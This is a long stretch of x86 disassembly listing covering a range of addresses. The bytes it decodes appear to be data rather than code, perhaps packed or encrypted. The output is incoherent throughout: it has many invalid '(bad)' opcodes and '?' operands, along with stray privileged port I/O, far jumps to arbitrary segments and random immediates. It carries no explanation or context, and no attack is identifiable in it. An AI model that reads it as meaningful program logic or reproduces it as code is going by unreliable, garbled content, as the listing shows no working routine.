  420dfe:	sbb    ah,BYTE PTR [edi-0x4702c278]
  420e04:	(bad)  [ecx-0x7d7a36c6]
  420e0a:	imul   edx,DWORD PTR [edi],0xffffffab
  420e0d:	adc    al,0x6a
  420e0f:	inc    ecx
  420e10:	sbb    DWORD PTR gs:[ebx],edi
  420e13:	fsub   st(6),st
  420e15:	in     eax,dx
  420e16:	popf   
  420e17:	call   0x9358:0x9c0f80cf
  420e1e:	(bad)  
  420e1f:	push   esp
  420e20:	xchg   esp,eax
  420e21:	push   0x9dee734c
  420e26:	xor    eax,0x7bc6003d
  420e2b:	aad    0x94
  420e2d:	inc    eax
  420e2e:	cli    
  420e2f:	cmp    DWORD PTR [edx+0x386f822c],esp
  420e35:	mov    cl,0x85
  420e37:	or     eax,0x859be204
  420e3c:	loope  0x420e03
  420e3e:	scas   eax,DWORD PTR es:[edi]
  420e3f:	xchg   ecx,esp
  420e41:	sahf   
  420e42:	fadd   QWORD PTR [ecx+eax*1]
  420e45:	js     0x420e44
  420e47:	sub    al,0x2e
  420e49:	push   ss
  420e4a:	xchg   edi,eax
  420e4b:	sbb    DWORD PTR [edi+ebx*1],0xffffffe8
  420e4f:	xor    al,0xbe
  420e51:	(bad)  
  420e52:	in     al,0xe4
  420e54:	sub    al,0x8d
  420e56:	outs   dx,BYTE PTR ds:[esi]
  420e57:	or     dl,BYTE PTR [esi+edi*2-0x45]
  420e5b:	inc    ebp
  420e5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e5d:	into   
  420e5e:	push   ecx
  420e5f:	mov    ch,0x78
  420e62:	adc    eax,0x65d2346c
  420e67:	std    
  420e68:	daa    
  420e69:	cdq    
  420e6a:	ror    BYTE PTR [esi-0xd],0x51
  420e6e:	out    dx,eax
  420e6f:	jmp    0xe9fc:0x2d15785e
  420e76:	cli    
  420e77:	push   ss
  420e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e79:	jecxz  0x420e29
  420e7b:	mov    dh,BYTE PTR [esi+0xa]
  420e7e:	call   0xff40:0x9f05a1c1
  420e85:	mov    ah,BYTE PTR [ecx]
  420e87:	fs ret 0xc479
  420e8b:	sub    BYTE PTR ds:0xcf42063e,dl
  420e91:	push   esp
  420e92:	or     edx,DWORD PTR [edi-0x72]
  420e95:	and    BYTE PTR [esi+0x2f],ah
  420e98:	mov    al,ds:0x9fabea59
  420e9d:	or     esp,eax
  420e9f:	fnstenv [ebx-0x48c30c1e]
  420ea5:	repz mov cl,0xe6
  420ea8:	test   BYTE PTR [ecx+0x43d6dd56],ch
  420eae:	(bad)  
  420eaf:	mov    cl,0xf1
  420eb1:	mov    bl,0x86
  420eb3:	shl    BYTE PTR [esi-0x40065963],1
  420eb9:	xchg   bl,dh
  420ebb:	mov    cl,0x47
  420ebd:	aaa    
  420ebe:	(bad)  
  420ebf:	pop    esp
  420ec0:	or     eax,0x9e0f21
  420ec5:	aas    
  420ec6:	pop    eax
  420ec7:	(bad)  
  420ec9:	and    BYTE PTR [ebx+0x70f2b870],dl
  420ecf:	or     DWORD PTR [ebx+0xd],eax
  420ed2:	add    al,0xbe
  420ed4:	lods   eax,DWORD PTR ds:[esi]
  420ed5:	test   eax,0x735c3812
  420eda:	push   edx
  420edb:	xor    eax,0xc888ad8a
  420ee0:	and    al,0xb6
  420ee2:	fnop   
  420ee4:	or     BYTE PTR [edi],al
  420ee6:	adc    BYTE PTR [ebx+0xcd0e06e],bl
  420eec:	jmp    0xc06948f9
  420ef1:	sbb    BYTE PTR ds:0x52943713,dh
  420ef7:	dec    ebx
  420ef8:	xchg   ebp,eax
  420ef9:	loope  0x420ea0
  420efb:	or     al,0x4b
  420efd:	push   ebx
  420efe:	rcr    BYTE PTR [ebp-0x7a],0x29
  420f02:	int3   
  420f03:	and    BYTE PTR [eax],bh
  420f05:	gs dec eax
  420f07:	dec    edx
  420f08:	cld    
  420f09:	dec    edi
  420f0a:	in     eax,0x3d
  420f0c:	add    bl,BYTE PTR [ebx]
  420f0e:	inc    edi
  420f0f:	xor    BYTE PTR [edx-0x5005a2c4],ah
  420f15:	out    0x80,al
  420f17:	adc    DWORD PTR [esi+0x47ed6d70],0x10
  420f1e:	repz dec edx
  420f20:	neg    DWORD PTR [edx]
  420f22:	push   eax
  420f23:	jnp    0x420f08
  420f25:	call   0x37ef66ca
  420f2a:	test   BYTE PTR [esp+eax*8-0x34646e1a],0x9
  420f32:	mov    ah,0xc3
  420f34:	imul   edx,DWORD PTR [edi],0x7f32a006
  420f3a:	jne    0x420fbb
  420f3c:	pop    ebp
  420f3d:	lods   al,BYTE PTR ds:[esi]
  420f3e:	pop    ebx
  420f3f:	or     ebp,DWORD PTR [ebx+0x359aa3e0]
  420f45:	inc    eax
  420f46:	mov    esi,0x6870984
  420f4b:	ins    DWORD PTR es:[edi],dx
  420f4c:	std    
  420f4d:	inc    edx
  420f4e:	ret    
  420f4f:	retf   0x5bef
  420f52:	outs   dx,BYTE PTR ds:[esi]
  420f53:	pushf  
  420f54:	stos   DWORD PTR es:[edi],eax
  420f55:	inc    ebx
  420f56:	aas    
  420f57:	mov    al,0x26
  420f59:	sub    ecx,DWORD PTR [eax-0x31bf02ba]
  420f5f:	outs   dx,DWORD PTR ds:[esi]
  420f60:	mov    BYTE PTR [edi],bh
  420f62:	repz xchg esp,eax
  420f64:	repz das 
  420f66:	jmp    0x59cc:0x992132e9
  420f6d:	xchg   BYTE PTR [ebx],bl
  420f6f:	push   esp
  420f70:	fwait
  420f71:	dec    esp
  420f72:	cmp    eax,0xf22b8dcb
  420f77:	bound  eax,QWORD PTR [ecx+0x62ff4143]
  420f7d:	and    DWORD PTR [eax],0xffffff90
  420f80:	cwde   
  420f81:	jecxz  0x420f63
  420f83:	inc    eax
  420f84:	iret   
  420f85:	ins    BYTE PTR es:[edi],dx
  420f86:	div    BYTE PTR [esi-0x45f228c9]
  420f8c:	mov    ecx,0xf0c5184
  420f91:	jbe    0x420fc1
  420f93:	sub    esi,DWORD PTR [eax]
  420f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f96:	jl     0x420fce
  420f98:	push   cs
  420f99:	(bad)  
  420f9a:	adc    BYTE PTR gs:[edi+0x22],bh
  420f9e:	pop    eax
  420f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fa0:	pop    ds
  420fa1:	mov    eax,ds:0x1304604b
  420fa6:	mov    ds:0x4817418a,al
  420fab:	pushf  
  420fac:	inc    esi
  420fad:	jl     0x420f75
  420faf:	mov    ah,0xd8
  420fb1:	xor    dh,ah
  420fb3:	fild   QWORD PTR [eax]
  420fb5:	(bad)  
  420fb6:	pop    eax
  420fb7:	push   edi
  420fb8:	aad    0x7b
  420fba:	fwait
  420fbb:	lds    ebp,FWORD PTR [edi-0x6f7c1b4f]
  420fc1:	jns    0x42103c
  420fc3:	jnp    0x420f95
  420fc5:	cmp    ah,cl
  420fc7:	enter  0xd6ef,0xaf
  420fcb:	jmp    0x421036
  420fcd:	mov    dl,0x2e
  420fcf:	cmp    bh,BYTE PTR [ecx]
  420fd1:	jno    0x421004
  420fd3:	popa   
  420fd4:	mov    edi,0xe996f05
  420fd9:	ja     0x421005
  420fdb:	dec    ebx
  420fdc:	adc    bh,ch
  420fde:	jmp    0x8617080e
  420fe3:	cmp    ecx,DWORD PTR [esi]
  420fe5:	inc    esp
  420fe6:	cmp    esp,DWORD PTR [ecx+0x3b]
  420fe9:	ror    DWORD PTR [edi],1
  420feb:	pop    ss
  420fec:	dec    eax
  420fed:	sbb    al,0xc2
  420fef:	stc    
  420ff0:	inc    esi
  420ff1:	add    eax,0x1b2d33
  420ff6:	adc    esi,ebp
  420ff8:	ret    0x8e01
  420ffb:	fs pushf 
  420ffd:	pop    esi
  420ffe:	pop    edi
  420fff:	inc    ecx
  421000:	mov    eax,ds:0x74cfdbe3
  421005:	add    ah,BYTE PTR [edx+eax*2-0x35]
  421009:	adc    DWORD PTR [ecx-0xef26757],0x7e058307
  421013:	inc    eax
  421014:	out    dx,eax
  421015:	cmp    eax,0xaf5647bd
  42101a:	dec    ebp
  42101b:	or     al,0x0
  42101d:	mov    esp,DWORD PTR [edx+0x4f]
  421020:	jns    0x420fc6
  421022:	lahf   
  421023:	mov    esp,0x6e5325b7
  421028:	frstor [ebx]
  42102a:	xchg   edx,eax
  42102b:	jl     0x421059
  42102d:	ss imul edi,eax,0xeefa9f76
  421034:	add    BYTE PTR [ebx+0x6d],dl
  421037:	xchg   ebp,eax
  421038:	jno    0x4210a2
  42103a:	jb     0x420ff7
  42103c:	push   edi
  42103d:	push   ss
  42103e:	pop    esp
  42103f:	jnp    0x420fcf
  421041:	dec    ebp
  421042:	cmp    esi,DWORD PTR [ebx-0x22]
  421045:	xchg   esp,eax
  421046:	or     edi,edi
  421048:	call   0x36c90807
  42104d:	std    
  42104e:	push   0xffffffbd
  421050:	ja     0x420ff7
  421052:	cwde   
  421053:	stos   DWORD PTR es:[edi],eax
  421054:	mov    ecx,0x7d15e358
  421059:	and    DWORD PTR [eax+0x58a1f5da],ebx
  42105f:	mov    ds:0x3878cdfb,eax
  421064:	mov    esi,0xa3857c5a
  421069:	fs cld 
  42106b:	retf   
  42106c:	xor    edi,esp
  42106e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42106f:	mov    ch,0x30
  421071:	sub    al,0x6f
  421073:	add    DWORD PTR [esi+0x6b],edi
  421076:	jmp    0x421032
  421078:	(bad)  
  421079:	test   al,0x8c
  42107b:	xchg   edx,eax
  42107c:	scas   al,BYTE PTR es:[edi]
  42107d:	push   ebp
  42107e:	inc    ecx
  42107f:	ror    dh,0xfb
  421082:	adc    DWORD PTR [ecx-0x462431ed],0xac93775c
  42108c:	jno    0x4210af
  42108e:	pop    esi
  42108f:	push   es
  421090:	mov    al,ds:0x9ae16969
  421095:	jne    0x42101a
  421097:	sub    eax,DWORD PTR [eax+eiz*2+0x4e]
  42109b:	cwde   
  42109c:	ror    dh,1
  42109e:	mov    ebx,0x3efed740
  4210a3:	repz out dx,al
  4210a5:	mov    al,0x2e
  4210a7:	lahf   
  4210a8:	fs jge 0x4210ac
  4210ab:	inc    eax
  4210ac:	jnp    0x4210d8
  4210ae:	mov    al,ds:0x885b929f
  4210b3:	jno    0x4210d4
  4210b5:	ins    BYTE PTR es:[edi],dx
  4210b6:	iret   
  4210b7:	das    
  4210b8:	xor    dl,BYTE PTR [esi]
  4210ba:	pop    es
  4210bb:	lods   eax,DWORD PTR ds:[esi]
  4210bc:	mov    ecx,0x86ecb66
  4210c1:	int    0x94
  4210c3:	scas   eax,DWORD PTR es:[edi]
  4210c4:	cmp    ebp,ecx
  4210c6:	std    
  4210c7:	scas   al,BYTE PTR es:[edi]
  4210c8:	fst    st(4)
  4210ca:	add    eax,0xa77078ae
  4210cf:	sbb    DWORD PTR [ebp-0x6d],eax
  4210d2:	and    BYTE PTR [edx-0x4f41fb9b],ch
  4210d8:	lds    edx,FWORD PTR [edx-0x22]
  4210db:	ins    DWORD PTR es:[edi],dx
  4210dc:	dec    edi
  4210dd:	inc    edi
  4210de:	sub    ebp,DWORD PTR [edx]
  4210e0:	dec    esp
  4210e1:	sbb    esi,eax
  4210e3:	test   esi,esp
  4210e5:	js     0x4210b3
  4210e7:	(bad)  
  4210e8:	repnz fistp WORD PTR [edi+0x28]
  4210ec:	into   
  4210ed:	sar    BYTE PTR [ecx-0x3cc58d9e],cl
  4210f3:	cmp    edi,ebx
  4210f5:	add    ch,BYTE PTR ds:0x25d27852
  4210fb:	frstor [edx-0x1039118e]
  421101:	or     BYTE PTR [esi],ch
  421103:	dec    ecx
  421104:	stos   BYTE PTR es:[edi],al
  421105:	xchg   ecx,eax
  421106:	js     0x42111f
  421108:	add    bh,ah
  42110a:	sub    ecx,DWORD PTR [edi]
  42110c:	adc    al,0x19
  42110e:	jl     0x421135
  421110:	or     dl,BYTE PTR [ecx+0x737882de]
  421116:	sub    DWORD PTR [edi-0x20471922],0xffffffe6
  42111d:	push   es
  42111e:	js     0x42111a
  421120:	sar    esp,cl
  421122:	mov    cl,0xeb
  421124:	std    
  421125:	push   0xffffffeb
  421127:	ss ss add ebx,ebp
  42112b:	cdq    
  42112c:	out    dx,eax
  42112d:	mov    ah,0x37
  42112f:	jne    0x4211aa
  421131:	imul   ecx,DWORD PTR [ebx+0x502f6049],0x4df386d5
  42113b:	and    ch,BYTE PTR [ebp+0x68]
  42113e:	mov    bl,0x6b
  421140:	int3   
  421141:	loope  0x4210c3
  421143:	mov    ?,eax
  421145:	xor    esp,DWORD PTR [edi]
  421147:	test   BYTE PTR [esi],dh
  421149:	call   0xff25:0x41a27e8c
  421150:	pop    ecx
  421151:	lods   al,BYTE PTR ds:[esi]
  421152:	push   edx
  421153:	nop
  421154:	iret   
  421155:	mov    DWORD PTR ds:0x41e23054,eax
  42115b:	xchg   ebx,eax
  42115c:	push   ss
  42115d:	lds    ebp,FWORD PTR [ecx-0x4c]
  421160:	ins    BYTE PTR es:[edi],dx
  421161:	mov    dh,0x2f
  421163:	mov    WORD PTR ds:0xc36f98b5,ds
  421169:	or     esi,DWORD PTR [ebx+0x5dc415d7]
  42116f:	mov    BYTE PTR [ecx+0x304d71b5],0xd6
  421176:	dec    eax
  421177:	mov    al,BYTE PTR [esp+esi*1+0x6c]
  42117b:	(bad)  
  42117c:	mov    edx,0x7ccdee9f
  421181:	sub    cl,dh
  421183:	pop    ebp
  421184:	shr    BYTE PTR [ecx+edi*2-0x2a2c0d3],cl
  42118b:	dec    ecx
  42118c:	jo     0x42118d
  42118e:	inc    edi
  42118f:	dec    ecx
  421190:	mov    esi,0x6279a9f4
  421195:	cmc    
  421196:	bound  ecx,QWORD PTR [esi-0x386f2ff3]
  42119c:	mov    bh,0x45
  42119e:	xor    DWORD PTR ds:0xab4b29f3,edi
  4211a4:	and    eax,0xffffff9c
  4211a7:	js     0x421196
  4211a9:	and    ch,cl
  4211ab:	adc    bl,BYTE PTR [edi]
  4211ad:	xor    edx,0x9226c839
  4211b3:	popf   
  4211b4:	pushf  
  4211b5:	mov    ah,0x7d
  4211b7:	ins    DWORD PTR es:[edi],dx
  4211b8:	add    BYTE PTR gs:[esi],bh
  4211bb:	xor    al,0xaa
  4211be:	in     eax,dx
  4211bf:	daa    
  4211c0:	push   ebx
  4211c1:	sub    eax,DWORD PTR [edx]
  4211c3:	cmp    al,0xbb
  4211c5:	fst    QWORD PTR [esi+0x5d6397d9]
  4211cb:	inc    ebx
  4211cc:	or     esp,DWORD PTR [esi+0x4d80660a]
  4211d2:	xor    cl,BYTE PTR [ecx+0x357db894]
  4211d8:	fucomp st(7)
  4211da:	dec    esp
  4211db:	or     DWORD PTR [ebx+0x3f],ecx
  4211de:	lds    edx,FWORD PTR [ebx+0x781e16d2]
  4211e4:	stos   BYTE PTR es:[edi],al
  4211e5:	xlat   BYTE PTR ss:[ebx]
  4211e7:	add    DWORD PTR [edi-0xf],ecx
  4211ea:	adc    dh,BYTE PTR [edx+0x31fa71a7]
  4211f0:	mov    es,WORD PTR [ecx+eiz*8+0x36]
  4211f4:	pop    esp
  4211f5:	popa   
  4211f6:	(bad)  
  4211f7:	enter  0x9f2b,0x93
  4211fb:	mov    dl,0xc2
  4211fd:	mov    cl,BYTE PTR [esi+0x2a]
  421200:	mov    WORD PTR [esi-0x49],fs
  421203:	int3   
  421204:	fisttp DWORD PTR [eiz*4+0x6e864766]
  42120b:	cs iret 
  42120d:	lds    ebx,FWORD PTR [edx-0x2b]
  421210:	mov    bl,0xe0
  421212:	out    dx,eax
  421213:	(bad)  
  421214:	outs   dx,DWORD PTR ds:[esi]
  421215:	inc    ebx
  421216:	sbb    ecx,DWORD PTR ds:0xf7a526fc
  42121c:	inc    esp
  42121d:	leave  
  42121e:	call   DWORD PTR [ecx+0x4a]
  421221:	lock xchg ebp,eax
  421223:	lock fstp DWORD PTR [edi+0x5a48d4c3]
  42122a:	loop   0x42122a
  42122c:	aas    
  42122d:	daa    
  42122e:	jl     0x4211ee
  421230:	adc    BYTE PTR [ecx],0x1e
  421233:	je     0x421250
  421235:	(bad)
  421239:	push   0x555b550a
  42123e:	sub    ah,ah
  421240:	in     al,dx
  421241:	fbstp  TBYTE PTR [ecx+0x6c647dd2]
  421247:	mov    ds:0xa6418137,eax
  42124c:	imul   edi,ecx,0x20
  42124f:	dec    eax
  421250:	adc    BYTE PTR [ecx+0x3ed2c5c2],bl
  421256:	sub    dl,cl
  421258:	inc    ebx
  421259:	jae    0x421257
  42125b:	and    eax,DWORD PTR [eax-0x10deb6f7]
  421261:	inc    ecx
  421262:	icebp  
  421263:	ins    DWORD PTR es:[edi],dx
  421264:	pop    esp
  421265:	ror    ebp,cl
  421267:	push   0x72
  421269:	dec    esp
  42126a:	cli    
  42126b:	(bad)
  42126e:	dec    edx
  42126f:	mov    ch,cl
  421271:	mov    ebp,0xc9756d7d
  421276:	push   esi
  421277:	iret   
  421278:	mov    al,ds:0x607d4ce2
  42127d:	mov    ebp,0x137533ad
  421282:	push   esp
  421283:	arpl   WORD PTR [edx-0x13],di
  421286:	and    DWORD PTR [ebx+0x136d9890],0xffffff93
  42128d:	scas   al,BYTE PTR es:[edi]
  42128e:	test   DWORD PTR [ebp+edi*4-0x599c15cc],ebp
  421295:	in     eax,0x5
  421297:	push   eax
  421298:	and    edx,esi
  42129a:	push   ss
  42129b:	sub    ebx,eax
  42129d:	inc    edi
  42129e:	ficomp DWORD PTR [esi+edx*8+0x11b61c91]
  4212a5:	sub    eax,0x5139c9ea
  4212aa:	fdiv   DWORD PTR [ebx+0x9788763]
  4212b0:	ja     0x42130d
  4212b2:	xchg   esi,eax
  4212b3:	shr    BYTE PTR [ecx+ecx*4+0x3b22ba68],cl
  4212ba:	das    
  4212bb:	addr16 adc al,0xb8
  4212be:	jns    0x42132f
  4212c0:	test   eax,0x102bdefc
  4212c5:	xchg   DWORD PTR [edi-0x7d],ebx
  4212c8:	je     0x42128b
  4212ca:	mov    bl,0x2e
  4212cc:	cs jmp 0xd6048fa8
  4212d2:	pop    DWORD PTR [edx+0x75c5cf58]
  4212d8:	or     DWORD PTR [ebp+0x18],0xffffff9a
  4212dc:	mov    ebx,0x1889389e
  4212e1:	cs iret 
  4212e3:	mov    ?,ebp
  4212e5:	mov    bl,0xb
  4212e7:	pushf  
  4212e8:	jl     0x42135d
  4212ea:	or     al,0xc7
  4212ec:	ret    0x2670
  4212ef:	cli    
  4212f0:	fmul   st,st(4)
  4212f2:	int    0x7
  4212f4:	and    eax,0x977b493d
  4212f9:	mov    edi,0x3304b37c
  4212fe:	ret    
  4212ff:	bnd jp 0x421365
  421302:	inc    ebx
  421303:	cmp    ebp,esi
  421305:	(bad)  
  421306:	in     eax,dx
  421307:	fild   DWORD PTR [esp+ebp*4-0x7a]
  42130b:	jbe    0x421374
  42130d:	inc    esp
  42130e:	sbb    al,0x4d
  421310:	shr    BYTE PTR [ebp+0x7c739098],1
  421316:	pop    edi
  421317:	push   esi
  421318:	xchg   edi,eax
  421319:	into   
  42131a:	fwait
  42131b:	mov    ebx,0x371845f0
  421320:	add    dl,BYTE PTR [ecx]
  421322:	loopne 0x421316
  421324:	shl    DWORD PTR [ecx+0xa],0x56
  421328:	ficomp DWORD PTR [ecx+0x35]
  42132b:	ins    BYTE PTR es:[edi],dx
  42132c:	lahf   
  42132d:	xor    eax,0x27ffe7f
  421332:	adc    DWORD PTR [ebp+eiz*2+0x63],ebx
  421336:	cmp    esp,DWORD PTR [edx]
  421338:	dec    edx
  421339:	icebp  
  42133a:	dec    esp
  42133b:	out    dx,al
  42133c:	es mov ebp,0x27a6dd19
  421342:	jns    0x4212f9
  421344:	adc    esi,DWORD PTR [edi]
  421346:	stos   DWORD PTR es:[edi],eax
  421347:	jg     0x42134e
  421349:	(bad)  
  42134a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42134b:	lods   al,BYTE PTR ds:[esi]
  42134c:	add    ebp,ecx
  42134e:	(bad)  
  421350:	aad    0xe1
  421352:	xchg   edi,eax
  421353:	add    eax,0xaf111d15
  421358:	sbb    bh,BYTE PTR [ebp+0xb1aac3d]
  42135e:	retf   0xa68c
  421361:	jmp    FWORD PTR [esi-0x6e2a9b4e]
  421367:	xchg   ebp,eax
  421368:	(bad)  
  421369:	push   0xffffffd3
  42136b:	and    DWORD PTR [eax+esi*1-0x5d],edi
  42136f:	dec    esi
  421370:	sub    al,0xe2
  421372:	push   esp
  421373:	xor    DWORD PTR [ebx],eax
  421375:	add    BYTE PTR [edx-0x2f07ab8b],ch
  42137b:	xchg   BYTE PTR [esp+edx*4-0x7870f467],ch
  421382:	push   eax
  421383:	sub    BYTE PTR [eax],0xa8
  421386:	js     0x42138a
  421388:	mov    DWORD PTR [ecx+0x79e2cb9c],ebx
  42138e:	in     eax,dx
  42138f:	push   ebx
  421390:	lds    edi,FWORD PTR [ebx+0x3c565f23]
  421396:	call   0x5b851f9e
  42139b:	pop    edi
  42139c:	sbb    eax,0x8b5318fa
  4213a1:	out    dx,al
  4213a2:	jp     0x4213b3
  4213a4:	mov    esi,edi
  4213a6:	mov    al,ds:0x5fd15d71
  4213ab:	xchg   ebp,eax
  4213ac:	add    DWORD PTR [esi-0x4bce6a94],eax
  4213b2:	and    DWORD PTR [eax-0x261d2a92],esi
  4213b8:	ret    0x4374
  4213bb:	clc    
  4213bc:	shr    DWORD PTR [edi],1
  4213be:	nop
  4213bf:	lock pop ebx
  4213c1:	cdq    
  4213c2:	mov    ebp,0x1cd7906d
  4213c7:	add    bl,BYTE PTR [si]
  4213ca:	jle    0x4213d4
  4213cc:	adc    DWORD PTR [ebx],ebp
  4213ce:	mov    ds:0xf178027f,eax
  4213d3:	imul   ecx,DWORD PTR [ebx],0x24ebb69a
  4213d9:	je     0x4213e3
  4213db:	push   0x9
  4213dd:	push   edx
  4213de:	pusha  
  4213df:	xor    eax,0xd2324a40
  4213e4:	jns    0x4213bc
  4213e6:	daa    
  4213e7:	xchg   edx,eax
  4213e8:	ret    0xa770
  4213eb:	addr16 push ss
  4213ed:	(bad)  
  4213ef:	fstp   TBYTE PTR [edi+ebx*8-0x5120e1fd]
  4213f6:	jae    0x421411
  4213f8:	or     al,0x41
  4213fa:	ret    
  4213fb:	cmp    DWORD PTR [edi-0x63b2d72c],ebp
  421401:	jnp    0x421475
  421403:	pop    esi
  421404:	xor    al,0xd5
  421406:	cmp    al,0x20
  421408:	cli    
  421409:	push   ss
  42140a:	and    eax,0xcef961f1
  42140f:	sbb    edx,DWORD PTR [ebp+0x1ca517bf]
  421415:	nop
  421416:	stos   DWORD PTR es:[edi],eax
  421417:	sbb    al,0x45
  421419:	fadd   QWORD PTR [ebx-0x5f629f4b]
  42141f:	or     cl,BYTE PTR [edx]
  421421:	mov    al,ds:0x72a9a1a3
  421426:	jg     0x4213bb
  421428:	pop    es
  421429:	test   eax,0xe627dbb3
  42142e:	imul   edi,DWORD PTR [ecx-0x52],0xffffffd7
  421432:	inc    ebp
  421433:	mov    dh,0x12
  421435:	jbe    0x421422
  421437:	(bad)  
  421438:	ror    BYTE PTR [esi],cl
  42143a:	bound  esp,QWORD PTR [ecx-0x80]
  42143d:	cmp    DWORD PTR [edx+ecx*8],ebx
  421440:	arpl   WORD PTR [esi+0x45],sp
  421443:	jg     0x4213d5
  421445:	clc    
  421446:	je     0x4213ea
  421448:	loop   0x4213e0
  42144a:	mov    dh,0x5
  42144c:	inc    ecx
  42144d:	fwait
  42144e:	pop    edx
  42144f:	cmp    al,0xe3
  421451:	jne    0x421456
  421453:	iret   
  421454:	pop    ebx
  421455:	mov    al,0x74
  421457:	test   al,0x7f
  421459:	pop    dx
  42145b:	inc    ecx
  42145c:	ins    DWORD PTR es:[edi],dx
  42145d:	fmul   QWORD PTR [edi-0x54]
  421460:	pusha  
  421461:	cli    
  421462:	dec    eax
  421463:	xchg   ecx,eax
  421464:	mov    al,ds:0x978a0bd3
  421469:	pop    ebx
  42146a:	jmp    0x4213f9
  42146c:	out    dx,al
  42146d:	shr    eax,0xcd
  421470:	mov    ch,0x7b
  421472:	or     ebp,edx
  421474:	test   al,0x4
  421476:	jmp    0x51fe3a42
  42147b:	ins    DWORD PTR es:[edi],dx
  42147c:	cmp    eax,0x2416162e
  421481:	imul   esi,DWORD PTR [edx],0xdee15c5c
  421487:	xor    BYTE PTR [esi],bl
  421489:	das    
  42148a:	and    BYTE PTR [eax+0x39],al
  42148d:	push   edi
  42148e:	and    eax,0xf3fc3389
  421493:	lds    ebp,FWORD PTR ds:0xb7044d9
  421499:	xchg   ebp,eax
  42149a:	pushf  
  42149b:	sub    eax,DWORD PTR [ebp+edx*2-0x13]
  42149f:	mov    edx,0x5731f61c
  4214a4:	js     0x4214d4
  4214a6:	repnz lods eax,DWORD PTR ds:[esi]
  4214a8:	mov    ebx,0x38fa3043
  4214ad:	fild   DWORD PTR [esi-0x75]
  4214b0:	xchg   esp,eax
  4214b1:	and    eax,0xa3d4d6c1
  4214b6:	mov    eax,ds:0xe78d5202
  4214bb:	jmp    0xb740:0x9ba2f00b
  4214c2:	pop    esi
  4214c3:	fld    QWORD PTR [edx]
  4214c5:	out    dx,al
  4214c6:	mov    ds:0x2ae0bed2,eax
  4214cb:	cmc    
  4214cc:	enter  0xed69,0x80
  4214d0:	pop    ebx
  4214d1:	retf   
  4214d2:	sub    BYTE PTR [esi+0xb64a8e1],ah
  4214d8:	mov    eax,0x7462c294
  4214dd:	je     0x4214c5
  4214df:	mov    bh,0x78
  4214e1:	iret   
  4214e2:	mov    ebx,0xbdfa00e
  4214e7:	stos   DWORD PTR es:[edi],eax
  4214e8:	push   edx
  4214e9:	popf   
  4214ea:	add    BYTE PTR [esi-0x26],bl
  4214ed:	retf   
  4214ee:	adc    al,0xc3
  4214f0:	arpl   WORD PTR [ebp+edx*1-0x65],si
  4214f4:	xor    ebp,esp
  4214f6:	or     BYTE PTR [edi],ch
  4214f8:	push   esi
  4214f9:	jp     0x421536
  4214fb:	std    
  4214fc:	adc    al,0x1
  4214fe:	xchg   BYTE PTR [edx],bl
  421500:	jge    0x421572
  421502:	stos   BYTE PTR es:[edi],al
  421503:	mov    edi,0x744d5c86
  421508:	ds loopne 0x421583
  42150b:	cmp    al,0x61
  42150d:	fld    TBYTE PTR [eax+0x70]
  421510:	js     0x421512
  421512:	fistp  WORD PTR ds:0x2bbe7df0
  421518:	add    eax,0x5ecfd06d
  42151d:	sbb    BYTE PTR [eax+ecx*1+0x6ea76c9f],ch
  421524:	sub    BYTE PTR [ebx-0x455a7b52],ch
  42152a:	add    al,BYTE PTR [ebx-0x10]
  42152d:	inc    edx
  42152e:	add    dh,BYTE PTR [ecx+0x68028650]
  421534:	mov    BYTE PTR [esi+0x5d73340b],bh
  42153a:	in     eax,dx
  42153b:	ffree  st(5)
  42153d:	(bad)  
  42153e:	imul   esp,DWORD PTR [edx],0x4a
  421541:	jmp    FWORD PTR [esi]
  421543:	mov    al,ds:0xddfe7174
  421548:	popa   
  421549:	inc    esi
  42154a:	lods   al,BYTE PTR ds:[esi]
  42154b:	rol    DWORD PTR [esi+0x2a4d80e2],0x54
  421552:	imul   esp,DWORD PTR [ebp+0xd],0x15ff7b3f
  421559:	ret    0x2bc6
  42155c:	je     0x4215b3
  42155e:	ins    DWORD PTR es:[edi],dx
  42155f:	push   ebx
  421560:	mov    ah,0xdf
  421562:	add    esp,ebx
  421564:	sbb    DWORD PTR [ebp-0x6dcaaebe],edi
  42156a:	pop    esp
  42156b:	rcl    DWORD PTR [ebx+0x4c],0xba
  42156f:	xchg   ebx,eax
  421570:	fsubp  st(1),st
  421572:	sbb    al,0x4c
  421574:	adc    dh,BYTE PTR [ecx]
  421576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421577:	pop    es
  421578:	and    eax,0xfb4f388d
  42157d:	adc    ecx,DWORD PTR [ecx-0x1a]
  421580:	xchg   esi,eax
  421581:	rol    DWORD PTR [esi],1
  421583:	adc    al,0x3e
  421585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421586:	test   al,0x8f
  421588:	imul   esp,ebx,0x0
  42158b:	out    dx,al
  42158c:	sbb    BYTE PTR gs:[esi+0x372034d0],al
  421593:	jl     0x42152f
  421595:	bound  esp,QWORD PTR [esi]
  421597:	sbb    eax,0xb67c3f95
  42159c:	jae    0x421533
  42159e:	stos   DWORD PTR es:[edi],eax
  42159f:	cli    
  4215a0:	cmp    eax,0x362792a3
  4215a5:	or     al,0x28
  4215a7:	lock mov esp,DWORD PTR [edi+0x8ab5c33]
  4215ae:	iret   
  4215af:	ss mov ah,0x88
  4215b2:	and    BYTE PTR ds:0x7348d0db,bl
  4215b8:	xor    ax,0x35f0
  4215bc:	pop    ss
  4215bd:	adc    al,0x97
  4215bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215c0:	call   0x402dea63
  4215c5:	sbb    ebx,DWORD PTR [esi]
  4215c7:	rcr    DWORD PTR [ecx],1
  4215c9:	mov    edx,0x702a6a55
  4215ce:	jne    0x4215e8
  4215d0:	sub    ebx,DWORD PTR [ecx-0x597d53f8]
  4215d6:	xchg   edi,eax
  4215d7:	xor    edi,ebx
  4215d9:	inc    edi
  4215da:	xchg   esi,eax
  4215db:	rol    BYTE PTR [esp+ecx*2+0x237766f2],cl
  4215e2:	mov    esi,0xa61843bd
  4215e7:	mov    ch,0xbe
  4215e9:	mov    bl,0x30
  4215eb:	daa    
  4215ec:	add    dh,al
  4215ee:	and    esi,DWORD PTR [eax]
  4215f0:	sti    
  4215f1:	test   eax,0xb40977d7
  4215f6:	cwde   
  4215f7:	or     BYTE PTR [eax],0xe1
